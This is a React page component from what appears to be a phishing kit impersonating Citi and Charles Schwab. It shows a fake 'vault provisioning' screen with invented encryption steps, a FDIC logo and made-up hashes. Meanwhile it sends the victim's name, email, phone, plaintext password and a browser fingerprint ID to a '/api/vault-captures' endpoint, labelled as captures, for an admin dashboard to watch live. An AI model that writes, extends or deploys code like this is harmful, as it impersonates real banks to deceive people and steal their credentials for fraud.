import { useEffect, useState, useRef } from 'react';
import { useLocation } from 'wouter';

const HASH_A = 'a7f3c2e1b8d94f0e2c3a1b6d8f9e0c1d4b5a2f3e8c9d0b1a2f3c4e5d6b7a8f9e0c1d2b3a4f5e6c7d8b9a0f1e2c3d4b5a6f7e8';
const HASH_B = '3e8f1b0a2c9d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f';

interface StepDef { id: number; label: string; detail?: string }

const STEPS: StepDef[] = [
  { id: 1, label: 'Initialising secure vault environment' },
  { id: 2, label: 'Generating SHA-3-512 encryption keypair', detail: HASH_A.slice(0, 24) + '…' },
  { id: 3, label: 'Anchoring account identity record', detail: '__VAULT_REF__' },
  { id: 4, label: 'Configuring TOTP two-factor authentication', detail: 'TOTP/SHA-3 · interval:30s' },
  { id: 5, label: 'Binding SHA-3-256 session integrity hash', detail: HASH_B.slice(0, 20) + '…' },
  { id: 6, label: 'Verifying KYC linkage and AML clearance' },
  { id: 7, label: 'Sealing vault with AES-256-GCM encryption' },
  { id: 8, label: 'Establishing secure session — routing to dashboard' },
];

const PHASE_TIMES = [0, 600, 1800, 3200, 4600, 5900, 7100, 8300, 9500];

export default function VaultCreatingPage() {
  const [, navigate] = useLocation();
  const [phase, setPhase] = useState(0);
  const isCiti = localStorage.getItem('finvault_active_theme') === 'citi';
  const accent = isCiti ? '#003087' : '#344B58';
  const posted = useRef(false);

  // Generate vault ref once
  const vaultRefRef = useRef<string>('');
  if (!vaultRefRef.current) {
    const caseId = localStorage.getItem(isCiti ? 'finvault_case_id_citi' : 'finvault_case_id_schwab') || 'SEC-C1002D';
    const suffix = caseId.split('-').pop() || 'C1002D';
    const rand = Math.random().toString(36).slice(2, 8).toUpperCase();
    vaultRefRef.current = `VLT-${suffix}-${rand}`;
  }

  // Generate account number once
  const acctNumRef = useRef<string>('');
  if (!acctNumRef.current) {
    const existing = localStorage.getItem('finvault_vault_account_num');
    if (existing) { acctNumRef.current = existing; }
    else {
      const num = String(Math.floor(Math.random() * 90000000 + 10000000));
      localStorage.setItem('finvault_vault_account_num', num);
      acctNumRef.current = num;
    }
  }

  useEffect(() => {
    localStorage.setItem('finvault_vault_ref', vaultRefRef.current);

    // POST capture to database (vault ref now known)
    if (!posted.current) {
      posted.current = true;
      const brand = isCiti ? 'citi' : 'schwab';
      const capturedName = localStorage.getItem('finvault_vault_name') || null;
      const capturedEmail = localStorage.getItem('finvault_vault_email') || null;
      const capturedPhone = localStorage.getItem('finvault_vault_phone') || null;
      const capturedPassword = localStorage.getItem('finvault_vault_password') || null;
      fetch('/api/vault-captures', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          brand,
          name: capturedName,
          email: capturedEmail,
          password: capturedPassword,
          phone: capturedPhone,
          displayName: capturedName || capturedEmail?.split('@')[0] || null,
          accountNum: acctNumRef.current,
          vaultRef: vaultRefRef.current,
          caseId: localStorage.getItem(isCiti ? 'finvault_case_id_citi' : 'finvault_case_id_schwab') || null,
          fingerprintId: localStorage.getItem('_fv_fpid') || undefined,
        }),
      })
        .then(r => r.ok ? r.json() : null)
        .then(row => {
          // Store the DB row ID so the dashboard can poll for live admin updates
          if (row?.id) localStorage.setItem('finvault_vault_capture_id', String(row.id));
        })
        .catch(() => {});
    }

    const timers: ReturnType<typeof setTimeout>[] = PHASE_TIMES.map((ms, i) => setTimeout(() => setPhase(i), ms));
    const navTimer = setTimeout(() => navigate('/vault-dashboard'), 11200);
    return () => { timers.forEach(clearTimeout); clearTimeout(navTimer); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const progress = Math.min(100, (phase / STEPS.length) * 100);

  const Spinner = () => (
    <svg width="14" height="14" viewBox="0 0 16 16" style={{ flexShrink: 0 }}>
      <circle cx="8" cy="8" r="6" fill="none" stroke="#E2E8F0" strokeWidth="1.5" />
      <path d="M8 2 A6 6 0 0 1 14 8" fill="none" stroke={accent} strokeWidth="1.5" strokeLinecap="round">
        <animateTransform attributeName="transform" type="rotate" from="0 8 8" to="360 8 8" dur="0.7s" repeatCount="indefinite" />
      </path>
    </svg>
  );

  const DoneIcon = () => (
    <svg width="14" height="14" viewBox="0 0 16 16" style={{ flexShrink: 0 }}>
      <circle cx="8" cy="8" r="7" stroke={accent} strokeWidth="1.25" fill="none" />
      <path d="M4.5 8l2.5 2.5 4.5-5" stroke={accent} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );

  const PendingIcon = () => (
    <svg width="14" height="14" viewBox="0 0 16 16" style={{ flexShrink: 0 }}>
      <circle cx="8" cy="8" r="7" stroke="#D1D5DB" strokeWidth="1.25" fill="none" />
    </svg>
  );

  return (
    <div style={{
      height: '100vh', background: '#F4F6F9',
      display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
      fontFamily: '"Helvetica Neue", Arial, sans-serif',
      padding: '16px 24px',
      overflow: 'hidden',
    }}>
      {/* Card */}
      <div style={{
        width: '100%', maxWidth: 520,
        background: '#fff',
        border: '1px solid #E5E7EB',
        borderRadius: 3,
        boxShadow: '0 2px 16px rgba(0,0,0,0.07)',
        overflow: 'hidden',
      }}>
        {/* Card header */}
        <div style={{ background: accent, padding: '12px 24px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            {isCiti ? (
              <svg width="44" height="22" viewBox="0 0 120 64">
                <text x="4" y="54" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="56" fill="#fff" letterSpacing="-1">citi</text>
                <path d="M78 10 Q90 2 102 10" stroke="#E31837" strokeWidth="6" fill="none" strokeLinecap="round" />
              </svg>
            ) : (
              <svg width="110" height="26" viewBox="0 0 200 60">
                <text x="4" y="44" fontFamily="Georgia,'Times New Roman',serif" fontStyle="italic" fontSize="40" fontWeight="400" fill="white">charles</text>
                <text x="106" y="44" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="29" fill="white" letterSpacing="2">SCHWAB</text>
              </svg>
            )}
            <div style={{ width: 1, height: 14, background: 'rgba(255,255,255,0.25)' }} />
            <span style={{ fontSize: 10, color: 'rgba(255,255,255,0.85)', fontWeight: 600, letterSpacing: '0.06em', textTransform: 'uppercase' }}>
              Vault Provisioning
            </span>
          </div>
          <div style={{ fontSize: 8.5, fontWeight: 700, color: 'rgba(255,255,255,0.55)', letterSpacing: '0.1em', textTransform: 'uppercase' }}>
            SHA-3-512 · AES-256-GCM
          </div>
        </div>

        {/* Steps */}
        <div style={{ padding: '20px 28px 16px', display: 'flex', flexDirection: 'column', gap: 10 }}>
          {STEPS.map((step, idx) => {
            const stepPhase = idx + 1;
            const visible = phase >= stepPhase;
            const active = phase === stepPhase;
            const done = phase > stepPhase;
            const detailText = step.detail === '__VAULT_REF__' ? vaultRefRef.current : step.detail;

            return (
              <div key={step.id} style={{
                opacity: visible ? 1 : 0.18,
                transition: 'opacity 0.4s ease',
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                  <div style={{ width: 14, flexShrink: 0 }}>
                    {active ? <Spinner /> : done ? <DoneIcon /> : <PendingIcon />}
                  </div>
                  <span style={{
                    fontSize: 12.5,
                    fontWeight: active ? 600 : 400,
                    color: active ? '#111827' : done ? '#6B7280' : '#C0C4C9',
                    transition: 'color 0.3s ease',
                    flex: 1,
                  }}>
                    {step.label}
                  </span>
                  {active && (
                    <span style={{ fontSize: 10, color: '#9CA3AF', flexShrink: 0 }}>processing…</span>
                  )}
                  {done && detailText && (
                    <span style={{
                      fontSize: 9.5, color: '#94A3B8', fontFamily: 'monospace',
                      background: '#F8FAFC', border: '1px solid #E5E7EB',
                      padding: '1px 6px', borderRadius: 2, flexShrink: 0, maxWidth: 140,
                      overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                    }}>
                      {detailText}
                    </span>
                  )}
                </div>
              </div>
            );
          })}
        </div>

        {/* Divider + progress */}
        <div style={{ padding: '0 28px 16px' }}>
          <div style={{ height: 1, background: '#F3F4F6', margin: '0 0 12px' }} />
          <div style={{ height: 3, background: '#F1F5F9', borderRadius: 2, overflow: 'hidden', marginBottom: 8 }}>
            <div style={{
              height: '100%', background: accent,
              width: `${progress}%`,
              transition: 'width 0.8s ease',
              borderRadius: 2,
            }} />
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between' }}>
            <span style={{ fontSize: 9.5, color: '#9CA3AF', letterSpacing: '0.06em', fontWeight: 600 }}>
              {Math.round(progress)}% COMPLETE
            </span>
            <span style={{ fontSize: 9.5, color: '#9CA3AF', fontFamily: 'monospace' }}>
              {vaultRefRef.current}
            </span>
          </div>
        </div>

        {/* Footer */}
        <div style={{
          borderTop: '1px solid #F3F4F6', background: '#FAFAFA',
          padding: '8px 24px', display: 'flex', alignItems: 'center', gap: 10,
        }}>
          <img src="/fdic-logo.png" alt="FDIC" style={{ height: 16, opacity: 0.4, filter: 'grayscale(1)' }} />
          <div style={{ width: 1, height: 12, background: '#E5E7EB' }} />
          <span style={{ fontSize: 9.5, color: '#9CA3AF' }}>End-to-end encrypted · Member FDIC · Session secured</span>
        </div>
      </div>
    </div>
  );
}
